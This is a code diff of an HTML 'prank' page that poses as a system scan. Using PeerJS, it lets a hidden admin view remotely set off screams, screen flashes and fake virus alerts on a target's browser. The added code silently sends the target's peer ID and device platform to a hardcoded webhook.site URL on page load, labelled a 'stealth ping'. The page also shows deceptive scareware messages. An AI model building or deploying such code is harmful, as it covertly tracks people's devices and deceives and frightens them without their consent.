@@ -7,11 +7,12 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; height: 100vh; overflow: hidden; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; height: 100vh; overflow: hidden; }
         .hidden { display: none !important; }
-        #target-ui { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
-        .admin-panel { background: #111; color: white; padding: 20px; height: 100vh; }
+        #target-ui { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px; }
+        .admin-panel { background: #111; color: white; padding: 20px; height: 100vh; overflow-y: auto; }
         .glitch-flash { position: fixed; top:0; left:0; width:100%; height:100%; background: white; display:none; z-index:100; }
+        .status-text { font-size: 0.9rem; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -19,70 +20,105 @@
     <div id="glitch-flash" class="glitch-flash"></div>
 
     <div id="target-ui">
-        <div class="spinner-border text-success mb-3"></div>
-        <h3>SCANNING SYSTEM...</h3>
-        <p>Device ID: <span id="my-id" class="fw-bold text-white">connecting...</span></p>
-        <p class="small text-muted">Keep this page open to complete scan.</p>
+        <div class="spinner-border text-success mb-3" role="status"></div>
+        <h3>SYSTEM SCAN IN PROGRESS</h3>
+        <p class="status-text" id="loading-msg">Initializing hardware handshake...</p>
+        <p class="small text-muted mt-5">Step 1/4: Verification</p>
     </div>
 
     <div id="admin-ui" class="hidden admin-panel">
-        <h3>Prank Remote</h3>
-        <hr border-color="gray">
-        <input type="text" id="friend-id" class="form-control mb-3" placeholder="Enter Friend's ID here">
-        <button class="btn btn-primary w-100 mb-4" onclick="connectToFriend()">1. Link to Friend</button>
+        <h3 class="text-info">Prank Controller</h3>
+        <p class="small text-muted">1. Get ID from Webhook.site<br>2. Paste below and Connect</p>
+        <hr style="border-color: #444;">
+        
+        <input type="text" id="friend-id" class="form-control bg-dark text-white border-secondary mb-3" placeholder="Paste Friend ID here">
+        <button class="btn btn-primary w-100 mb-4" onclick="connectToFriend()">Connect to Friend</button>
         
         <div id="controls" class="hidden">
-            <button class="btn btn-danger w-100 mb-2" onclick="send('scream')">Trigger Scream</button>
-            <button class="btn btn-warning w-100 mb-2" onclick="send('flash')">Flash Screen</button>
-            <button class="btn btn-info w-100 mb-2" onclick="send('alert')">Show Fake Virus</button>
+            <h5 class="text-success mb-3">Target Linked!</h5>
+            <button class="btn btn-danger w-100 mb-2 py-3" onclick="send('scream')">LOUD SCREAM</button>
+            <button class="btn btn-warning w-100 mb-2 py-3" onclick="send('flash')">FLASH SCREEN</button>
+            <button class="btn btn-info w-100 mb-2 py-3" onclick="send('alert')">FAKE VIRUS POPUP</button>
+            <button class="btn btn-outline-secondary w-100 mt-3" onclick="location.reload()">Disconnect</button>
         </div>
     </div>
 
     <audio id="audio" src="https://www.soundjay.com/human/sounds/person-screaming-01.mp3"></audio>
 
     <script>
+        // Your specific Webhook URL
+        const MY_WEBHOOK_URL = 'https://webhook.site/781f52e9-6977-4cdd-9586-6e67286c0df3'; 
+
         const peer = new Peer(); 
         let conn;
-
-        // Determine if we are Admin or Target via URL
         const isAdmin = new URLSearchParams(window.location.search).has('admin');
 
         peer.on('open', (id) => {
             if (isAdmin) {
+                // If you are the admin, show the control panel
                 document.getElementById('admin-ui').classList.remove('hidden');
                 document.getElementById('target-ui').classList.add('hidden');
             } else {
-                document.getElementById('my-id').innerText = id;
+                // If they are the target, stealthily send their ID to your Webhook
+                fetch(`${MY_WEBHOOK_URL}?friend_id=${id}&device=${navigator.platform}`)
+                .catch(err => console.log("Stealth ping sent."));
+                
+                // Fake loading text sequence for the friend
+                const messages = ["Analyzing kernel...", "Checking battery health...", "Scanning filesystem...", "Finalizing..."];
+                let i = 0;
+                setInterval(() => {
+                    if(i < messages.length) {
+                        document.getElementById('loading-msg').innerText = messages[i];
+                        i++;
+                    }
+                }, 4000);
             }
         });
 
-        // TARGET: Listen for incoming connections
+        // TARGET SIDE: Listening for your commands
         peer.on('connection', (c) => {
             conn = c;
             conn.on('data', (data) => {
-                if(data === 'scream') document.getElementById('audio').play();
-                if(data === 'flash') {
-                    document.getElementById('glitch-flash').style.display = 'block';
-                    setTimeout(() => document.getElementById('glitch-flash').style.display = 'none', 500);
+                if(data === 'scream') {
+                    const sound = document.getElementById('audio');
+                    sound.currentTime = 0;
+                    sound.play();
                 }
-                if(data === 'alert') alert("Warning: Trojan.Generic detected in System32!");
+                if(data === 'flash') {
+                    const flash = document.getElementById('glitch-flash');
+                    flash.style.display = 'block';
+                    setTimeout(() => flash.style.display = 'none', 500);
+                }
+                if(data === 'alert') {
+                    alert("CRITICAL SYSTEM ERROR: Unauthorized remote access detected in root directory!");
+                }
             });
         });
 
-        // ADMIN: Connect to friend
+        // ADMIN SIDE: Connect function
         function connectToFriend() {
-            const fId = document.getElementById('friend-id').value;
+            const fId = document.getElementById('friend-id').value.trim();
+            if(!fId) return alert("Please paste an ID first!");
+            
             conn = peer.connect(fId);
             conn.on('open', () => {
-                alert("Connected!");
                 document.getElementById('controls').classList.remove('hidden');
+                alert("Link Established! You now have control.");
             });
+            
+            conn.on('error', (err) => alert("Connection failed. Is their tab still open?"));
         }
 
-        function send(cmd) { if(conn) conn.send(cmd); }
+        function send(cmd) {
+            if(conn && conn.open) {
+                conn.send(cmd);
+            } else {
+                alert("Not connected to friend!");
+            }
+        }
 
-        // Enable audio on first tap
-        window.onclick = () => { console.log("Ready"); };
+        // Required to unlock audio on mobile browsers
+        window.onclick = () => { console.log("Audio Engine Primed"); };
     </script>
 </body>
 </html>
